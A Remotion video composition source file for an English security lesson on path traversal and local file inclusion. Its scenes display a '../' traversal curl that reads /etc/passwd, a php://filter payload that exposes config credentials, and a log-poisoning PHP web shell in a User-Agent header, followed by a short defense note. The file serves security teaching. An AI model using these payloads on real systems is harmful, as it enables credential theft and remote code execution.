// ── video/remotion/compositions/Hw05PathTraversalLfiEn.tsx ──
// English version of hw-05-path-traversal-lfi. Same visuals; beats
// re-measured against the EN wavs (word-level transcription, 2026-08-30).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS_EN, audioBase } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Scene 1: path traversal ───────────────────────────────
// EN: you control the file 3.3 · escape the web folder 7.2 · dot
// dot slash 17.9 · four times 21.3 · accounts file 25.5 · blindly
// joins 27.2 · absolute path 35.2.
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 30, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      PATH TRAVERSAL: <span style={{ color: THEME.red }}>ESCAPING THE WEB FOLDER</span>
    </div>
    <div style={{ width: 1000, textAlign: 'left', marginBottom: 18 }}>
      <RevealLine at={3.3} fps={fps} mark="▸" color={THEME.cyan}>your input chooses which file to include → you control the file, and sometimes much more</RevealLine>
      <RevealLine at={7.2} fps={fps} mark="▸" color={THEME.cyan}>path traversal lets you escape the web folder · LFI reads server files</RevealLine>
      <RevealLine at={17.9} fps={fps} mark="▸" color={THEME.amber}>an endpoint that serves files by name accepts dot dot slash to climb the tree</RevealLine>
      <RevealLine at={25.5} fps={fps} mark="▸" color={THEME.red}>repeated four times + /etc/passwd: the server blindly joins the path and returns the accounts file</RevealLine>
    </div>
    <TerminalWindow title={"kali@attacker-01:~$ curl 'http://10.0.0.11/?page=../../../../etc/passwd'"} width={980} delay={Math.round(24.2 * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.8 }}>
        <span style={{ color: THEME.green }}>root:x:0:0:root:/root:/bin/bash</span>
        {'\n'}<span style={{ color: THEME.dim }}>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
        {'\n'}<span style={{ color: THEME.dim }}>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
      </div>
    </TerminalWindow>
  </AbsoluteFill>
);

// ── Scene 2: LFI with php://filter ────────────────────────
// EN: includes it 2.2 · source code 5.5 · php filter 6.5 ·
// base64 encode 12.5 · config.php 13.8 · credentials 19.4 · one
// step deeper 24.8 · inside the application 31.4.
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 28, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      LFI: <span style={{ color: THEME.green }}>READING THE SOURCE CODE</span>
    </div>
    <div style={{ width: 1000, textAlign: 'left' }}>
      <RevealLine at={2.2} fps={fps} mark="▸" color={THEME.cyan}>the app doesn't just return the file — it includes it with include in PHP</RevealLine>
      <RevealLine at={10.4} fps={fps} mark="▸" color={THEME.amber}>php://filter/convert.base64-encode/resource=config.php</RevealLine>
      <RevealLine at={15.6} fps={fps} mark="▸" color={THEME.cyan}>the config never runs and comes back base64 encoded</RevealLine>
      <RevealLine at={19.4} fps={fps} mark="▸" color={THEME.red}>that's how you read credentials, API keys, and the code's logic</RevealLine>
      <RevealLine at={24.8} fps={fps} mark="▸" color={THEME.purple}>the same payload, one step deeper — looking inside the application</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Scene 3: LFI to RCE (log poisoning) + defense ────────
// EN: final escalation 0.1 · RCE 2.0 · into a log 5.1 · drop PHP
// 7.4 · user agent 11.5 · access log 17.5 · cmd equals id 19.8 ·
// shell 25.1 · defend 25.8 · whitelist 29.8 · least privilege 31.5.
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 28, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      FROM LFI TO <span style={{ color: THEME.red }}>RCE: LOG POISONING</span>
    </div>
    <div style={{ width: 1000, textAlign: 'left' }}>
      <RevealLine at={2.0} fps={fps} mark="▸" color={THEME.amber}>if the server writes requests into a log and you can include that log — drop PHP into a line</RevealLine>
      <RevealLine at={11.5} fps={fps} mark="▸" color={THEME.cyan}>User-Agent: &lt;?php system($_GET["cmd"]); ?&gt; lands in the access log</RevealLine>
      <RevealLine at={19.8} fps={fps} mark="▸" color={THEME.red}>include it, call cmd=id → a file that should never have been code executes yours → shell</RevealLine>
      <RevealLine at={25.8} fps={fps} mark="▸" color={THEME.green}>defend: never put user input into include/open paths · whitelist · least privilege</RevealLine>
    </div>
  </AbsoluteFill>
);

export const Hw05PathTraversalLfiEn: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS_EN['hw-05-path-traversal-lfi'];
  const starts = sceneStartFrames('hw-05-path-traversal-lfi', fps, 'en');
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase('en');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        <Audio src={staticFile(`${base}/hw-05-path-traversal-lfi/hw-05-scene1.wav`)} />
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        <Audio src={staticFile(`${base}/hw-05-path-traversal-lfi/hw-05-scene2.wav`)} />
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        <Audio src={staticFile(`${base}/hw-05-path-traversal-lfi/hw-05-scene3.wav`)} />
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
